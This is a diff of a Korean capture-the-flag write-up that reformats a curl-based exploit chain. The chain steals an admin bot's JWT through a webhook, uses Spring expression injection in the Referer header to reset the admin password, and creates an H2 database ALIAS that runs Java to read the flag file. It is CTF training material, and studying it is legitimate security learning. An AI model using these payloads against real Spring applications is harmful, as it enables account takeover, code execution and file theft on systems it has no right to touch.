@@ -106,9 +106,17 @@ export TARGET="http://challenges.ctf.sd:34513"
 USER="test"
 PASS="test"
 
-curl -s -X POST "$TARGET/api/auth/register"   -H "Content-Type: application/json"   -d "{"username":"$USER","password":"$PASS"}" >/dev/null
+curl -s -X POST "$TARGET/api/auth/register" \
+  -H "Content-Type: application/json" \
+  -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" \
+  >/dev/null
 
-TOKEN=$(curl -s -X POST "$TARGET/api/auth/login"   -H "Content-Type: application/json"   -d "{"username":"$USER","password":"$PASS"}"   | jq -r ".token")
+TOKEN="$(
+  curl -s -X POST "$TARGET/api/auth/login" \
+    -H "Content-Type: application/json" \
+    -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" \
+  | jq -r ".token"
+)"
 
 echo "$TOKEN"
 ```
@@ -131,13 +139,19 @@ PY
 
 DATA="${DATA/WEBHOOK/$WEBHOOK}"
 
-curl -s -X POST "$TARGET/api/boards"   -H "Authorization: Bearer $TOKEN"   -H "Content-Type: application/json"   -d "$DATA" >/dev/null
+curl -s -X POST "$TARGET/api/boards" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d "$DATA" \
+  >/dev/null
 ```
 
 #### 3.4 봇 방문 트리거 → ADMINJWT 확보
 
 ```bash
-curl -s -X POST "$TARGET/api/visit"   -H "Authorization: Bearer $TOKEN" >/dev/null
+curl -s -X POST "$TARGET/api/visit" \
+  -H "Authorization: Bearer $TOKEN" \
+  >/dev/null
 ```
 
 Webhook 로그에서 `token=` 값을 확인:
@@ -149,7 +163,10 @@ export ADMINJWT="(웹훅에서 획득한 관리자 토큰)"
 #### 3.5 Referer SSTI 확인
 
 ```bash
-curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMINJWT"   -H $'Referer: \x27 + ${7*7} + \x27' | grep -n "redirectAfterLogin"
+curl -s "$TARGET/api/admin/dashboard" \
+  -H "Authorization: Bearer $ADMINJWT" \
+  -H $'Referer: \x27 + ${7*7} + \x27' \
+| grep -n "redirectAfterLogin"
 ```
 
 응답에 `49`가 포함되면 SSTI 확정.
@@ -157,19 +174,30 @@ curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMINJWT"   -
 #### 3.6 Bean 접근 확인
 
 ```bash
-curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMINJWT"   -H $'Referer: \x27 + ${@environment.getProperty(\x27java.version\x27)} + \x27' | grep -n "redirectAfterLogin"
+curl -s "$TARGET/api/admin/dashboard" \
+  -H "Authorization: Bearer $ADMINJWT" \
+  -H $'Referer: \x27 + ${@environment.getProperty(\x27java.version\x27)} + \x27' \
+| grep -n "redirectAfterLogin"
 ```
 
 #### 3.7 관리자 계정 비밀번호 강제 재설정
 
 ```bash
-curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMINJWT"   -H $'Referer: \x27 + ${ {#u=@userRepository.findByUsername("admin").get(), #u.setPassword(@passwordEncoder.encode("Admin!234567")), @userRepository.save(#u), "OK"}[3] } + \x27' | grep -n "redirectAfterLogin"
+curl -s "$TARGET/api/admin/dashboard" \
+  -H "Authorization: Bearer $ADMINJWT" \
+  -H $'Referer: \x27 + ${ {#u=@userRepository.findByUsername("admin").get(), #u.setPassword(@passwordEncoder.encode("Admin!234567")), @userRepository.save(#u), "OK"}[3] } + \x27' \
+| grep -n "redirectAfterLogin"
 ```
 
 이후 `admin / Admin!234567`로 로그인하여 `ADMIN_TOKEN` 획득:
 
 ```bash
-ADMIN_TOKEN=$(curl -s -X POST "$TARGET/api/auth/login"   -H "Content-Type: application/json"   -d "{"username":"admin","password":"Admin!234567"}" | jq -r ".token")
+ADMIN_TOKEN="$(
+  curl -s -X POST "$TARGET/api/auth/login" \
+    -H "Content-Type: application/json" \
+    -d "{\"username\":\"admin\",\"password\":\"Admin!234567\"}" \
+  | jq -r ".token"
+)"
 
 echo "$ADMIN_TOKEN"
 ```
@@ -179,13 +207,19 @@ echo "$ADMIN_TOKEN"
 (1) ALIAS 생성:
 
 ```bash
-curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMIN_TOKEN"   -H $'Referer: \x27 + ${@jdbcTemplate.execute(\'CREATE ALIAS IF NOT EXISTS GETFLAG2 AS $$ String getflag2() throws Exception { try (java.util.stream.Stream<java.nio.file.Path> s = java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { java.nio.file.Path p = s.filter(x -> x.getFileName().toString().startsWith("flag-")).findFirst().orElse(null); if (p==null) return "NF"; return java.nio.file.Files.readString(p); } } $$\')} + \x27' >/dev/null
+curl -s "$TARGET/api/admin/dashboard" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H $'Referer: \x27 + ${@jdbcTemplate.execute(\'CREATE ALIAS IF NOT EXISTS GETFLAG2 AS $$ String getflag2() throws Exception { try (java.util.stream.Stream<java.nio.file.Path> s = java.nio.file.Files.list(java.nio.file.Paths.get("/"))) { java.nio.file.Path p = s.filter(x -> x.getFileName().toString().startsWith("flag-")).findFirst().orElse(null); if (p==null) return "NF"; return java.nio.file.Files.readString(p); } } $$\')} + \x27' \
+  >/dev/null
 ```
 
 (2) ALIAS 실행 → 플래그 출력:
 
 ```bash
-curl -s "$TARGET/api/admin/dashboard"   -H "Authorization: Bearer $ADMIN_TOKEN"   -H $'Referer: \x27 + ${@jdbcTemplate.queryForList(\'SELECT GETFLAG2() AS F\')[0].get(\'F\')} + \x27' | grep -oE "0xL4ugh\{[^}]+\}"
+curl -s "$TARGET/api/admin/dashboard" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H $'Referer: \x27 + ${@jdbcTemplate.queryForList(\'SELECT GETFLAG2() AS F\')[0].get(\'F\')} + \x27' \
+| grep -oE "0xL4ugh\{[^}]+\}"
 ```
 
 ---
